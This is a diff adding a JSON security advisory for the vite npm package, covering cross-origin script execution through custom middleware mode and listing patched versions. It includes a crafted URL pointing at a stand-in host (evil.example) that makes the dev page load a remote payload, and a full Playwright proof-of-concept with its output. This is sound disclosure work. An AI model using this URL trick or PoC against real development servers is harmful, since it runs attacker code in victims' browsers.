@@ -1,0 +1,83 @@
+{
+  "Severity": "LOW",
+  "UpdatedAt": "2026-10-21T16:48:15Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vite"
+  },
+  "Advisory": {
+    "DatabaseId": 520014,
+    "Id": "GSA_kwCzR0hTQS05anJxLXc3NXItOGdjd84AB-9O",
+    "GhsaId": "GHSA-9jrq-w75r-8gcw",
+    "References": [
+      {
+        "Url": "https://github.com/vitejs/vite/security/advisories/GHSA-9jrq-w75r-8gcw"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112945"
+      },
+      {
+        "Url": "https://github.com/vitejs/vite/pull/23653"
+      },
+      {
+        "Url": "https://github.com/vitejs/vite/commit/7dafd8e56f152403a3230608fa4005273c2e9e17"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-9jrq-w75r-8gcw"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-9jrq-w75r-8gcw"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-112945"
+      }
+    ],
+    "Description": "### Summary\n\nWhen accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n- the transformed HTML contains an inline module script\n- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\n### Details\n\n[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\n```js\nconst url = req.originalUrl\ntemplate = await vite.transformIndexHtml(url, template)\n```\n\nFor a development server at `http://localhost:5173`, an attacker can send this URL:\n\n```text\nhttp://localhost:5173//evil.example/payload.js?/../../package.json\n```\n\nIn Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\nChromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\n[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\n```html\n\u003cscript type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy\u0026index=0.js\"\u003e\u003c/script\u003e\n```\n\nThe generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\n### PoC\n\n```js\nimport { createServer as createHttpServer } from 'node:http'\nimport { createRequire } from 'node:module'\nimport { dirname, join } from 'node:path'\nimport { fileURLToPath, pathToFileURL } from 'node:url'\n\nconst directory = dirname(fileURLToPath(import.meta.url))\nconst require = createRequire(join(directory, 'package.json'))\nconst { chromium } = require('playwright-chromium')\nconst viteModule = await import(\n  pathToFileURL(require.resolve('vite')).href\n)\nconst createViteServer =\n  viteModule.createServer ?? viteModule.default.createServer\n\n// This loopback server stands in for a separately hosted attacker website.\nconst attackerPort = 4173\nconst exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\nconst html = '\u003cscript type=\"module\"\u003edocument.body.textContent = \"Vite app\"\u003c/script\u003e'\n\nconst listen = (server, port = 0) =\u003e\n  new Promise((resolve, reject) =\u003e {\n    server.once('error', reject)\n    server.listen(port, '127.0.0.1', () =\u003e {\n      server.off('error', reject)\n      resolve(server.address().port)\n    })\n  })\n\nconst close = (server) =\u003e\n  new Promise((resolve, reject) =\u003e {\n    server.close((error) =\u003e (error ? reject(error) : resolve()))\n  })\n\nlet attackerRequest = null\nconst attacker = createHttpServer((request, response) =\u003e {\n  attackerRequest = request.url\n  response.writeHead(200, {\n    'access-control-allow-origin': '*',\n    'content-type': 'text/javascript',\n  })\n  response.end(\n    \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n  )\n})\n\nconst vite = await createViteServer({\n  appType: 'custom',\n  configFile: false,\n  root: directory,\n  server: {\n    hmr: false,\n    middlewareMode: true,\n    watch: null,\n  },\n})\n\nconst application = createHttpServer((request, response) =\u003e {\n  vite.middlewares(request, response, async (error) =\u003e {\n    if (error) {\n      response.destroy(error)\n      return\n    }\n\n    try {\n      const transformed = await vite.transformIndexHtml(request.url, html)\n      response.writeHead(200, { 'content-type': 'text/html' })\n      response.end(transformed)\n    } catch (transformError) {\n      response.destroy(transformError)\n    }\n  })\n})\n\nawait listen(attacker, attackerPort)\nconst applicationPort = await listen(application)\nconst browser = await chromium.launch({ headless: true })\n\ntry {\n  const page = await browser.newPage()\n  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n  await page.waitForFunction(\n    () =\u003e document.documentElement.dataset.viteXssPoc === 'executed',\n  )\n\n  console.log(`attacker request: ${attackerRequest}`)\n  console.log('JavaScript from the attacker server executed in the Vite page')\n} finally {\n  await browser.close()\n  await close(application)\n  await vite.close()\n  await close(attacker)\n}\n```\n\nObserved output on Vite 8.2.1:\n```text\nattacker request: /payload.js?/../../package.json?html-proxy\u0026index=0.js\nJavaScript from the attacker server executed in the Vite page\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-21T16:48:14Z",
+    "Severity": "LOW",
+    "Summary": "Vite: Cross origin script execution through Vite custom middleware",
+    "UpdatedAt": "2026-10-21T16:48:15Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "6.4.4"
+      },
+      "VulnerableVersionRange": "\u003c= 6.4.3"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "7.3.7"
+      },
+      "VulnerableVersionRange": "\u003e= 7.0.0, \u003c= 7.3.6"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "8.1.6"
+      },
+      "VulnerableVersionRange": "\u003e= 8.0.0, \u003c= 8.1.5"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "8.2.4"
+      },
+      "VulnerableVersionRange": "\u003e= 8.2.0, \u003c= 8.2.3"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "8.3.3"
+      },
+      "VulnerableVersionRange": "\u003e= 8.3.0, \u003c= 8.3.2"
+    }
+  ]
+}
